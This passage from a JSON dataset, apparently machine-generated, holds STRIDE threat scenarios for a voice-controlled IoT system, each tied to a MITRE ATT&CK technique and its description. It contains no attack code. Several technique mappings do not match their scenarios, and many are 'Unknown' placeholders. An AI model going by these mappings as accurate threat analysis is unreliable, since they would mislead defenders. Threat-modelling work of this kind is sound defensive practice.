                "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",
                "id": "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619",
                "technique_id": "T1119"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious commands through the client-side application to control IoT Devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains control over the client-side application.",
                    "Role": "Attacker",
                    "Condition": "Successful compromise of client application"
                },
                {
                    "Assumption": "The system does not validate commands before executing them.",
                    "Role": "System Designer",
                    "Condition": "Lack of command validation"
                },
                {
                    "Assumption": "Users cannot monitor or override unintended device actions.",
                    "Role": "User",
                    "Condition": "Lack of real-time monitoring tools"
                }
            ],
            "Potential Impact": "Malicious commands can lead to unauthorized physical actions, posing safety risks and data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "Command Injection",
                "Client Compromise",
                "Device Control",
                "Safety Risk"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies issuing specific voice commands that have led to unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Voice commands are not logged or tracked.",
                    "Role": "System Designer",
                    "Condition": "Lack of logging mechanisms"
                },
                {
                    "Assumption": "System lacks proper authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Weak or non-existent voice authentication"
                },
                {
                    "Assumption": "The system does not use time-stamped logs for traceability.",
                    "Role": "System Designer",
                    "Condition": "Insufficient log management"
                }
            ],
            "Potential Impact": "Difficulty in determining the accountability of actions, which can lead to unauthorized actions and data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "Log Manipulation",
                "Non-repudiation",
                "Action Denial",
                "Voice Command"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker sends false server-side application requests and denies doing so.",
            "Assumptions": [
                {
                    "Assumption": "Server-side requests are not authenticated or tracked.",
                    "Role": "System Designer",
                    "Condition": "Lack of request authentication"
                },
                {
                    "Assumption": "Logs are not tamper-proof.",
                    "Role": "System Designer",
                    "Condition": "Weak log integrity mechanisms"
                },
                {
                    "Assumption": "The system does not monitor unusual request patterns.",
                    "Role": "System Administrator",
                    "Condition": "Lack of anomaly detection"
                }
            ],
            "Potential Impact": "Actions leading to unauthorized access and data manipulation without traceability.",
            "MITRE ATT&CK Keywords": [
                "Request Forgery",
                "Log Tampering",
                "Denial",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user denies configuring the IoT Devices in a particular way after a security incident.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not logged or monitored.",
                    "Role": "System Designer",
                    "Condition": "Lack of configuration monitoring"
                },
                {
                    "Assumption": "System lacks multi-factor authentication for configuration changes.",
                    "Role": "System Designer",
                    "Condition": "Single-factor authentication"
                },
                {
                    "Assumption": "The user legitimately accessed the system prior to the incident.",
                    "Role": "User",
                    "Condition": "Normal system access"
                }
            ],
            "Potential Impact": "Difficulty in tracking configuration changes, leading to potential security vulnerabilities and system misuse.",
            "MITRE ATT&CK Keywords": [
                "Configuration Tampering",
                "Non-repudiation",
                "Access Control",
                "Log Manipulation"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted voice data during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic between the client and server is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of encryption"
                },
                {
                    "Assumption": "The attacker has access to network infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Network monitoring capabilities"
                },
                {
                    "Assumption": "The system transmits sensitive information over these channels.",
                    "Role": "System Designer",
                    "Condition": "Transmission of sensitive data"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user commands and private information.",
            "MITRE ATT&CK Keywords": [
                "Network Sniffing",
                "Data Interception",
                "Encryption Bypass",
                "Sensitive Data"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized user gains access to cloud-stored logs and data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud-stored data is not properly secured or encrypted.",
                    "Role": "System Designer",
                    "Condition": "Weak cloud security"
                },
                {
                    "Assumption": "The attacker has access to cloud credentials.",
                    "Role": "Attacker",
                    "Condition": "Compromised cloud credentials"
                },
                {
                    "Assumption": "Cloud access logs are not regularly monitored.",
                    "Role": "System Administrator",
                    "Condition": "Poor log monitoring"
                }
            ],
            "Potential Impact": "Exposure of system usage patterns and sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "Cloud Security",
                "Unauthorized Access",
                "Data Breach",
                "Log Monitoring"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the server-side application to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Outdated or unpatched application"
                },
                {
                    "Assumption": "The attacker can identify and exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Technical proficiency and reconnaissance"
                },
                {
                    "Assumption": "Sensitive data is stored or processed by the application.",
                    "Role": "System Designer",
                    "Condition": "Sensitive data handling"
                }
            ],
            "Potential Impact": "Compromise of sensitive user and system data, leading to loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Vulnerability Exploitation",
                "Sensitive Data Access",
                "Server Compromise",
                "Unpatched Systems"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server-side application with excessive requests, causing it to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application lacks rate-limiting mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Absence of rate-limiting"
                },
                {
                    "Assumption": "The attacker can generate a large volume of requests.",
                    "Role": "Attacker",
                    "Condition": "Availability of resources for attack"
                },
                {
                    "Assumption": "Server capacity is inadequate to handle such attacks.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient server capacity and mitigations"
                }
            ],
            "Potential Impact": "Disruption of service availability, causing legitimate users to be unable to access or use the system.",
            "MITRE ATT&CK Keywords": [
                "Flooding",
                "Resource Exhaustion",
                "DoS Attack",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the IoT Controller with a malware that disrupts its operation.",
            "Assumptions": [
                {
                    "Assumption": "The IoT Controller lacks malware protection.",
                    "Role": "System Designer",
                    "Condition": "Absence of malware protection"
                },
                {
                    "Assumption": "The attacker can deliver the malware to the IoT Controller.",
                    "Role": "Attacker",
                    "Condition": "Delivery mechanism"
                },
                {
                    "Assumption": "The system does not have redundancy or failover mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Lack of redundancy"
                }
            ],
            "Potential Impact": "Denial of service to IoT devices, leading to non-operational or unresponsive devices.",
            "MITRE ATT&CK Keywords": [
                "Malware Injection",
                "Device Disruption",
                "Controller Compromise",
                "Non-operational Devices"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overloads the client-side application with malicious voice commands.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application does not have mechanisms to distinguish between legitimate and malicious commands.",
                    "Role": "System Designer",
                    "Condition": "Weak command validation"
                },
                {
                    "Assumption": "The attacker can generate a high volume of voice commands.",
                    "Role": "Attacker",
                    "Condition": "Ability to generate malicious commands"
                },
                {
                    "Assumption": "The system lacks mechanisms to throttle or reject excessive incoming commands.",
                    "Role": "System Designer",
                    "Condition": "Absence of throttling mechanisms"
                }
            ],
            "Potential Impact": "Overload of the client-side application, leading to unresponsiveness and potential service disruption.",
            "MITRE ATT&CK Keywords": [
                "Command Flooding",
                "Application Overload",
                "Service Disruption",
                "Voice Command"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a server-side vulnerability to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Outdated or unpatched application"
                },
                {
                    "Assumption": "The attacker can identify and exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Technical proficiency and reconnaissance"
                },
                {
                    "Assumption": "The application uses a flat privilege model without proper segregation of duties.",
                    "Role": "System Designer",
                    "Condition": "Weak privilege management"
                }
            ],
            "Potential Impact": "Unauthorized access to administrative functions, compromising system integrity and security.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Administrator Access",
                "Vulnerability Exploitation",
                "System Compromise"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker abuses a misconfigured IoT Controller to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The IoT Controller is misconfigured and does not properly enforce access controls.",
                    "Role": "System Designer",
                    "Condition": "Misconfiguration"
                },
                {
                    "Assumption": "The attacker has access to the controller's network or physical location.",
                    "Role": "Attacker",
                    "Condition": "Network or physical access"
                },
                {
                    "Assumption": "The system does not log and monitor access to the IoT Controller.",
                    "Role": "System Administrator",
                    "Condition": "Lack of access monitoring"
                }
            ],
            "Potential Impact": "Unauthorized control over IoT devices, leading to potential misuse and security risks.",
            "MITRE ATT&CK Keywords": [
                "Misconfiguration",
                "Privilege Misuse",
                "Access Control Bypass",
                "Device Control"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user with lower privileges exploits a bug in the client-side application to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has a bug that allows privilege escalation.",
                    "Role": "System Designer",
                    "Condition": "Software bug"
                },
                {
                    "Assumption": "The user has basic knowledge of the application's operation.",
                    "Role": "User",
                    "Condition": "Medium technical ability"
                },
                {
                    "Assumption": "The system does not have mechanisms to detect and prevent privilege escalation attempts.",
                    "Role": "System Designer",
                    "Condition": "Absence of detection mechanisms"
                }
            ],
            "Potential Impact": "Unauthorized access to higher-privilege functions, risking system integrity and security.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Software Bug",
                "Unauthorized Access",
                "Client Application"
            ],
            "mitre_technique": {
                "name": "Group Policy Discovery",
                "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
                "id": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b",
                "technique_id": "T1615"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics the voice of an authorized user to issue commands to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "Voice recognition is not sufficiently accurate.",
                    "Role": "Application Developer",
                    "Condition": "When voice recognition system fails to distinguish between voices."
                },
                {
                    "Assumption": "No additional authentication methods are used.",
                    "Role": "Security Architect",
                    "Condition": "System solely relies on voice for authentication."
                },
                {
                    "Assumption": "IoT Controller processes all commands without verification.",
                    "Role": "IoT Developer",
                    "Condition": "Controller lacks command verification checks."
                }
            ],
            "Potential Impact": "Unauthorized control over IoT devices, compromising physical security.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "voice command",
                "authentication",
                "IoT devices"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends spoofed audio signals directly to the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Server does not validate the origin of audio signals.",
                    "Role": "Server Developer",
                    "Condition": "Audio signal validation is weak or non-existent."
                },
                {
                    "Assumption": "Network traffic is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Communications between components are in clear text."
                },
                {
                    "Assumption": "Client-side application exposes endpoints.",
                    "Role": "Client Developer",
                    "Condition": "Application endpoints are accessible over the internet."
                }
            ],
            "Potential Impact": "Execution of unauthorized commands, potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "network spoofing",
                "audio signal injection",
                "server-side compromise",
                "command execution"
            ],
            "mitre_technique": {
                "name": "Indirect Command Execution",
                "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
                "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
                "technique_id": "T1202"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor exploits vulnerabilities in IoT devices to impersonate the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices possess firmware vulnerabilities.",
                    "Role": "IoT Device Manufacturer",
                    "Condition": "Devices use outdated or insecure firmware."
                },
                {
                    "Assumption": "IoT Controller does not authenticate devices.",
                    "Role": "Firmware Developer",
                    "Condition": "Devices can interact without mutual authentication."
                },
                {
                    "Assumption": "Network lacks segmentation.",
                    "Role": "Network Engineer",
                    "Condition": "All devices communicate on a flat network."
                }
            ],
            "Potential Impact": "Interception and control over IoT devices, leading to unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "device impersonation",
                "IoT firmware exploit",
                "network traffic manipulation",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies audio signals between the microphone and client-side application.",
            "Assumptions": [
                {
                    "Assumption": "Transmission of audio signals is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "Data is sent in clear text across the network."
                },
                {
                    "Assumption": "Network lacks intrusion detection mechanisms.",
                    "Role": "Security Analyst",
                    "Condition": "No systems in place to detect and prevent tampering."
                },
                {
                    "Assumption": "Client-side application trusts all received audio signals.",
                    "Role": "Application Developer",
                    "Condition": "Application lacks validation of audio data."
                }
            ],
            "Potential Impact": "Corruption of commands leading to incorrect actions, potential data breach.",
            "MITRE ATT&CK Keywords": [
                "network tampering",
                "signal interception",
                "data modification",
                "command corruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on IoT devices to accept malicious commands.",
            "Assumptions": [
                {
                    "Assumption": "IoT Devices have unpatched firmware vulnerabilities.",
                    "Role": "Device Manufacturer",
                    "Condition": "Devices are using outdated or vulnerable firmware."
                },
                {
                    "Assumption": "Devices are physically accessible to the attacker.",
                    "Role": "Facility Security",
                    "Condition": "Insufficient physical security controls."
                },
                {
                    "Assumption": "Firmware updates are not signed or verified.",
                    "Role": "IoT Developer",
                    "Condition": "Firmware lacks integrity verification mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized actions by IoT devices, potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "unauthorized firmware updates",
                "device compromise",
                "command execution"
            ],
            "mitre_technique": {
                "name": "Indirect Command Execution",
                "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
                "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
                "technique_id": "T1202"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies responses from the server to the client application.",
            "Assumptions": [
                {
